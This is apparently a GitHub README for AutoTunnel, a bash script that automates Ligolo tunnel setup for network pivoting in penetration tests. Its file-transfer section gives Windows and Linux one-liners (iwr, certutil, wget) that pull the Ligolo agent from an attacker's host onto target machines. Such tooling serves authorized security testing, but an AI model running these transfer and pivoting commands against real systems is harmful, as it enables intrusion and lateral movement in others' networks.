
# AutoTunnel

AutoTunnel is an automated script for setting up Ligolo tunnels, streamlining network pivoting during red team engagements and penetration tests. The script performs interface setup, IP routing, and launches a Python server for easy file transfer to target machines.

## Features
- Automates Ligolo tunnel setup.
- Checks and configures network interfaces.
- Deletes previous tunnel routes before adding new ones.
- Allows selection of the listening network interface.
- Starts a Python HTTP server for file transfers.
- Provides easy commands for transferring and running Ligolo agents on targets.
- Kills processes using port 65000 before starting the server.
- Automatically installs missing dependencies on the first run.

## Requirements
- Bash
- Ligolo Proxy & Agent
- lolcat (optional, for colored output)
- figlet (optional, for banner text)
- Python (for HTTP server)
- lsof (for checking port usage)

## Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/johniwasanmi/AutoTunnel.git
   cd AutoTunnel
   chmod +x AutoTunnel.sh
   ```
2. Install Dependencies If not already installed
   ```bash
   sudo apt update && sudo apt install figlet lolcat lsof
   ```
3. The script will automatically check for missing dependencies and install them on the first run.

## Usage
Run the script with:
```bash
./AutoTunnel.sh
```

If any required dependencies are missing, the script will install them before execution.

Follow the on-screen prompts to set up the Ligolo tunnel.

## File Transfer
The script automatically starts an HTTP server on port 65000, allowing easy transfer of the Ligolo agent:

For Windows target:
```powershell
iwr -uri http://<pwnbox_ip>:65000/ligolo_agent.exe -outfile ligolo.exe
```
Or using certutil:
```cmd
certutil.exe -f -urlcache -split "http://<pwnbox_ip>:65000/ligolo_agent.exe"
```

For Linux target:
```bash
wget http://<pwnbox_ip>:65000/ligolo_agent
```



## Notes
- Ensure you have sufficient permissions to modify network routes.




## Author
(PenDevOps)

## Disclaimer
This tool is for educational and authorized security testing purposes only. Misuse of this tool may result in legal consequences. The author is not responsible for any misuse or damage caused.

source from https://github.com/nicocha30/ligolo-ng
